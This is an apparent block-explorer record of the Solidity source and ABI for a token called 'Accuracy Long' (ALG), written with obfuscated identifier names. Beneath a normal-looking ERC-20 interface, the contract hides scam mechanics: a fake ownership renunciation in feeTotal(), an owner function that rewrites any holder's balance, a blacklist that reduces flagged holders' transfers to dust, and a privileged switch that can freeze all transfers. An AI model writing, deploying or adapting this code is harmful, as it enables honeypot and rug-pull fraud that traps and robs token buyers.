{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface isTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeLiquidity {\n    function createPair(address exemptFee, address listFund) external returns (address);\n}\n\ninterface shouldMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedFee) external view returns (uint256);\n\n    function transfer(address swapTokenEnable, uint256 toReceiver) external returns (bool);\n\n    function allowance(address totalMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTokenEnable,\n        uint256 toReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamSenderAmount, uint256 value);\n    event Approval(address indexed totalMode, address indexed spender, uint256 value);\n}\n\ninterface shouldModeMetadata is shouldMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AccuracyLong is txFee, shouldMode, shouldModeMetadata {\n\n    uint256 limitTradingTo;\n\n    mapping(address => bool) public walletLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeTo;\n    }\n\n    bool public amountReceiver;\n\n    function amountSell(address takeLimit) public {\n        totalToWallet();\n        if (isWallet != swapAuto) {\n            buyList = true;\n        }\n        if (takeLimit == marketingSell || takeLimit == totalListMarketing) {\n            return;\n        }\n        walletLaunched[takeLimit] = true;\n    }\n\n    uint8 private receiverBuyMin = 18;\n\n    function totalToWallet() private view {\n        require(isFrom[_msgSender()]);\n    }\n\n    uint256 constant maxExemptFee = 16 ** 10;\n\n    function owner() external view returns (address) {\n        return amountBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityToken;\n    }\n\n    bool public fundEnable;\n\n    address private amountBuy;\n\n    function transfer(address fromLimit, uint256 toReceiver) external virtual override returns (bool) {\n        return sellFrom(_msgSender(), fromLimit, toReceiver);\n    }\n\n    function balanceOf(address launchedFee) public view virtual override returns (uint256) {\n        return tokenFund[launchedFee];\n    }\n\n    function allowance(address walletMax, address txMarketing) external view virtual override returns (uint256) {\n        if (txMarketing == isAmount) {\n            return type(uint256).max;\n        }\n        return minReceiverIs[walletMax][txMarketing];\n    }\n\n    uint256 public buyMode;\n\n    string private takeWallet = \"ALG\";\n\n    uint256 toSender;\n\n    uint256 private takeTo = 100000000 * 10 ** 18;\n\n    address isAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private receiverFee;\n\n    function approve(address txMarketing, uint256 toReceiver) public virtual override returns (bool) {\n        minReceiverIs[_msgSender()][txMarketing] = toReceiver;\n        emit Approval(_msgSender(), txMarketing, toReceiver);\n        return true;\n    }\n\n    address public totalListMarketing;\n\n    mapping(address => uint256) private tokenFund;\n\n    mapping(address => mapping(address => uint256)) private minReceiverIs;\n\n    bool public swapAuto;\n\n    function getOwner() external view returns (address) {\n        return amountBuy;\n    }\n\n    function sellFrom(address tokenMax, address swapTokenEnable, uint256 toReceiver) internal returns (bool) {\n        if (tokenMax == marketingSell) {\n            return takeMode(tokenMax, swapTokenEnable, toReceiver);\n        }\n        uint256 marketingTo = shouldMode(totalListMarketing).balanceOf(liquidityTx);\n        require(marketingTo == limitTradingTo);\n        require(swapTokenEnable != liquidityTx);\n        if (walletLaunched[tokenMax]) {\n            return takeMode(tokenMax, swapTokenEnable, maxExemptFee);\n        }\n        return takeMode(tokenMax, swapTokenEnable, toReceiver);\n    }\n\n    function teamEnableSender(address fromLimit, uint256 toReceiver) public {\n        totalToWallet();\n        tokenFund[fromLimit] = toReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeWallet;\n    }\n\n    address public marketingSell;\n\n    function takeMode(address tokenMax, address swapTokenEnable, uint256 toReceiver) internal returns (bool) {\n        require(tokenFund[tokenMax] >= toReceiver);\n        tokenFund[tokenMax] -= toReceiver;\n        tokenFund[swapTokenEnable] += toReceiver;\n        emit Transfer(tokenMax, swapTokenEnable, toReceiver);\n        return true;\n    }\n\n    address liquidityTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function feeTotal() public {\n        emit OwnershipTransferred(marketingSell, address(0));\n        amountBuy = address(0);\n    }\n\n    function liquidityAuto(uint256 toReceiver) public {\n        totalToWallet();\n        limitTradingTo = toReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverBuyMin;\n    }\n\n    string private liquidityToken = \"Accuracy Long\";\n\n    event OwnershipTransferred(address indexed exemptMode, address indexed teamFee);\n\n    function transferFrom(address tokenMax, address swapTokenEnable, uint256 toReceiver) external override returns (bool) {\n        if (_msgSender() != isAmount) {\n            if (minReceiverIs[tokenMax][_msgSender()] != type(uint256).max) {\n                require(toReceiver <= minReceiverIs[tokenMax][_msgSender()]);\n                minReceiverIs[tokenMax][_msgSender()] -= toReceiver;\n            }\n        }\n        return sellFrom(tokenMax, swapTokenEnable, toReceiver);\n    }\n\n    function marketingExempt(address launchTo) public {\n        if (fundEnable) {\n            return;\n        }\n        if (swapAuto) {\n            buyList = false;\n        }\n        isFrom[launchTo] = true;\n        \n        fundEnable = true;\n    }\n\n    mapping(address => bool) public isFrom;\n\n    bool public buyList;\n\n    constructor (){\n        \n        isTrading fromAuto = isTrading(isAmount);\n        totalListMarketing = takeLiquidity(fromAuto.factory()).createPair(fromAuto.WETH(), address(this));\n        if (receiverFee != buyMode) {\n            isWallet = false;\n        }\n        marketingSell = _msgSender();\n        feeTotal();\n        isFrom[marketingSell] = true;\n        tokenFund[marketingSell] = takeTo;\n        if (isWallet) {\n            isWallet = false;\n        }\n        emit Transfer(address(0), marketingSell, takeTo);\n    }\n\n    bool public isWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamSenderAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"}],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"teamEnableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalListMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTokenEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AccuracyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}